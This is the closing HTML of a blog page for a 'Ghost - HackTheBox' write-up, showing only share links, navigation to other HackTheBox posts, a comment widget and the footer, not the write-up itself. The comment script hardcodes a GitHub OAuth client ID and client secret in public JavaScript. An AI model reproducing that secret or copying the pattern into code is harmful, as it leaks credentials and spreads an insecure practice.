      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/07/22/GreenHorn-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">GreenHorn - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/07/08/PermX-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">PermX - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2025</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&title=《Ghost - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&title=《Ghost - HackTheBox》 — 喵喵喵喵&source=木を植える最も良い時期は、10年前である。次にいい時期は今である。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ghost - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2024/07/15/Ghost-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3aS27DMAwFwNz/0i7QVYA0ziNpF600WgWB7GS0IPjR4xGv43s9f35eyZ7zna9PPe5YGBgY/5ZxnK7XH0t+/t3+d+/Pj+ztsxgYGBsw5kH2PAbm4TV5PwYGBkbyuqO4zn8xSRwxMDAweilaL+3L00oMDAyMahFbLW7zIrZ6QBgYGLsxeoOB3/l8+3wDAwPjzzN6hWi1ZK022sr/CgMDY2nGPL07L1CTZ+fDUQwMjB0YvVIzB1eTwuogAQMDY23G/ApFEnarB5GnmBgYGDswqiPG3ngyj/2ToIyBgbE2I/HlDbJJ+ToZRWBgYKzKyNO4XuisDgN6pTIGBsbajHn7vjlujBt8vZ0YGBjrMfJLFb1hQP5Nb5iKgYGxNuOqaxbVhl1SuGJgYGC8FrFJeM1b+dU9PRgGBsYOjLyBNU/7br8choGBsSjjqpdWE8Hq2ODDoWBgYGzG6KV31VFotQH3IfhiYGAszcivZFUZV10dqx43BgbGeoz8qlYeRnsjgWTMEN0QwcDAWJTRa8TnSWQ1KSwPUzEwMJZmTErZPOxOrm5gYGBgHMVVvR4xafcnaSsGBsYOjMn1rPOX5mE3H0IkjT8MDIxVGXnjrBoQJ52x8kFgYGBswKg2zvIxQy+Ul3diYGBgxI22SWaaj0J/eAMGBgZG3Oiv/rn8yArzDQwMjEUZ117wmpfB5cEnBgbG0ox5AZkkf/clkRgYGEszvgDaJah28FSL1gAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
